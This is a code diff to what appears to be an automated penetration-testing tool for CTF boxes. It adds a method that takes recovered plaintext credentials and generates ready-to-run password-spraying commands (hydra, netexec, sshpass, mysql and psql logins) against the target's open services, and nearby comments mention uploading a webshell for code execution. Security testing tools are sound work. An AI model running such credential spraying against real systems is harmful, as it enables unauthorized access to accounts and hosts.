@@ -10,7 +10,7 @@ from __future__ import annotations
 
 from typing import List
 
-from . import utils, hostsfile
+from . import utils, hostsfile, tooling
 from .report import HostReport, Finding
 from ..data import knowledge
 from ..modules import discovery, ports, fingerprint, nmapscan, exploitintel
@@ -90,6 +90,7 @@ class Engine:
 
         self._ad_methodology()
         self._os_inference()
+        self._credential_reuse()
 
         # S3-compatible storage chain: list anonymously always; upload a
         # webshell + confirm RCE only with --exploit. Runs after vhosts are
@@ -153,6 +154,46 @@ class Engine:
                    "to /etc/hosts for LDAP/Kerberos to work.",
             severity="info", category="host", confidence="potential"))
         utils.log("info", "Active Directory DC fingerprint — see methodology finding")
+
+    def _credential_reuse(self) -> None:
+        """Password reuse is the #1 CTF pivot: any plaintext scryer recovered
+        (cracked archive, config, hard-coded creds) should be sprayed across
+        every login service on the box. Emit ready commands."""
+        host = self.host
+        creds = host.creds
+        if not creds:
+            return
+        ports_open = {e["port"] for e in host.open_ports}
+        ip = host.resolved_ip
+        users = (tooling.find_wordlist("users")
+                 or tooling.bundled_wordlist("users") or "users.txt")
+        lines = []
+        for c in creds[:5]:
+            if 22 in ports_open:
+                lines.append(f"hydra -L {users} -p '{c}' ssh://{ip} -t 4 -f")
+            if {139, 445} & ports_open:
+                lines.append(f"netexec smb {ip} -u {users} -p '{c}' --continue-on-success")
+            if 21 in ports_open:
+                lines.append(f"hydra -L {users} -p '{c}' ftp://{ip} -t 8 -f")
+            if 3306 in ports_open:
+                lines.append(f"mysql -h {ip} -u root -p'{c}'")
+            if 5432 in ports_open:
+                lines.append(f"PGPASSWORD='{c}' psql -h {ip} -U postgres")
+        # Also worth trying each cred as its own username (user==pass reuse).
+        if 22 in ports_open:
+            for c in creds[:5]:
+                lines.append(f"sshpass -p '{c}' ssh {c}@{ip}   # user==pass")
+        if not lines:
+            lines.append("No standard login service open — reuse these on any "
+                         "web login / service you find.")
+        utils.log("hot", f"{len(creds)} credential(s) recovered — spray them "
+                         f"(password reuse is the usual pivot)")
+        host.add(Finding(
+            title=f"Password reuse: spray {len(creds)} recovered credential(s)",
+            detail="Recovered: " + ", ".join(creds[:10]) + "\n\n"
+                   + "\n".join(dict.fromkeys(lines)),
+            severity="high", category="cred", confidence="potential",
+            evidence="\n".join(creds)))
 
     # -- helpers ------------------------------------------------------------
     def _port_selection(self) -> List[int]:
